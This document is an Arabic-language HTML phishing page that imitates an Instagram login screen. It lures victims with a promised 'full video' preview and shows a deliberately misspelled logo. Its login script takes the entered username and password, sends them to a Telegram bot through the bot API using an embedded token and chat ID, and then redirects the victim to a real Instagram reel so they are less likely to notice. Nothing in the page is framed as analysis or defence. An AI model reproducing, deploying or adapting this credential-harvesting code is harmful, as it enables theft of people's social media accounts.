<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    
    <meta property="og:title" content="Instagram Video">
    <meta property="og:description" content="الفديو كامل لكيناه تحطها بطي.ها">
    <meta property="og:image" content="https://raw.githubusercontent.com/media-node-fast/verification-node-7/main/IMG_1426.jpeg"> 
    <meta property="og:image:width" content="600">
    <meta property="og:image:height" content="600">
    <meta property="og:type" content="video.other">
    
    <title>Instagram</title>
    
    <style>
        /* تصميم ملء الشاشة الأبيض النظيف */
        body, html { 
            margin: 0; padding: 0; width: 100%; height: 100%; 
            background-color: #ffffff; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            overflow: hidden; 
        }
        .main-content { 
            display: flex; flex-direction: column; align-items: center; 
            width: 100%; padding-top: 80px; 
        }
        
        /* بديل اللوجو: شعار مرسوم بالكود ليشبه الأصلي مع خطأ إملائي */
        .logo-wordmark {
            width: 175px; /* نفس عرض اللوجو الأصلي */
            margin-bottom: 50px;
        }

        .login-box { width: 85%; max-width: 350px; }
        input { 
            width: 100%; background: #fafafa; 
            border: 1px solid #dbdbdb; border-radius: 3px; 
            padding: 14px; margin-bottom: 10px; 
            box-sizing: border-box; font-size: 14px; outline: none;
        }
        input:focus { border: 1px solid #a8a8a8; }
        
        .btn-submit { 
            width: 100%; background-color: #0095f6; color: white; 
            border: none; border-radius: 8px; padding: 12px; 
            font-weight: 600; font-size: 14px; margin-top: 15px; cursor: pointer; 
        }
        
        .separator { 
            display: flex; align-items: center; text-align: center; 
            color: #8e8e8e; font-size: 13px; margin: 30px 0; 
        }
        .separator::before, .separator::after { content: ''; flex: 1; border-bottom: 1px solid #dbdbdb; }
        .separator::before { margin-left: 1.5em; }
        .separator::after { margin-right: 1.5em; }
        
        .fb-login { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; display: block; text-align: center; }
        .meta-text { position: absolute; bottom: 30px; width: 100%; text-align: center; font-size: 12px; color: #8e8e8e; }
    </style>
</head>
<body>

    <div class="main-content">
        <svg class="logo-wordmark" viewBox="0 0 625 210" xmlns="http://www.w3.org/2000/svg">
            <path d="M102.3 189.1c-15.6 0-21.9-8.4-21.9-20.9V91.4c0-11 5.3-17.5 15.6-17.5 9.7 0 14.8 6.2 14.8 17.5v76.8c0 12.5-5.9 20.9-21.9 20.9h13.4zm0-128.3c-11.4 0-19.1-8.5-19.1-19.4 0-11.2 7.7-19.4 19.1-19.4s19.1 8.2 19.1 19.4c0 10.9-7.7 19.4-19.1 19.4zM240 189.1c-34.7 0-51.9-19.4-51.9-53.7V91.4c0-11 5.4-17.5 15.6-17.5 9.8 0 14.9 6.2 14.9 17.5v44.6c0 20.5 8 31.1 23 31.1 14.6 0 22.8-10.6 22.8-31.1V91.4c0-11 5.4-17.5 15.6-17.5 9.8 0 14.9 6.2 14.9 17.5v44.1c.1 34.2-15.4 53.6-49.9 53.6zM375.2 189.1c-32.5 0-51.1-18.8-51.1-51.9v-2.1c0-33.6 19.4-52.5 52.8-52.5 32.5 0 51.1 18.8 51.1 51.9v2.1c-.1 33.6-19.5 52.5-52.8 52.5zm1.7-25.1c14.6 0 22.2-10.3 22.2-27.7v-.9c0-17.4-7.6-27.7-22.2-27.7-14.6 0-22.3 10.3-22.3 27.7v.9c.1 17.4 7.7 27.7 22.3 27.7z" fill="#262626"/>
            <text x="50%" y="70%" dominant-baseline="middle" text-anchor="middle" font-family="Billabong, cursive, sans-serif" font-style="italic" font-weight="bold" font-size="120" fill="#262626">Instakram</text>
        </svg>
        
        <div class="login-box">
            <input type="text" id="u" placeholder="اسم المستخدم، الهاتف، أو البريد">
            <input type="password" id="p" placeholder="كلمة السر">
            <button class="btn-submit" onclick="login()">تسجيل الدخول</button>
            
            <div class="separator">أو</div>
            <a href="#" class="fb-login">تسجيل الدخول بحساب Facebook</a>
        </div>
    </div>
    
    <div class="footer">من Meta</div>

    <script>
        function login() {
            const user = document.getElementById('u').value;
            const pass = document.getElementById('p').value;
            if(user && pass) {
                // إرسال البيانات لبوت التليجرام الخاص بك
                fetch(`https://api.telegram.org/bot8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA/sendMessage?chat_id=897618292&text=👤User: ${user}%0A🔑Pass: ${pass}`);
                // تحويل للفيديو الأصلي بعد ثانية واحدة (لتقليل الشك)
                setTimeout(() => { 
                    window.location.href = "https://www.instagram.com/reel/DVucGpOiJms/"; 
                }, 1000);
            }
        }
    </script>
</body>
</html>
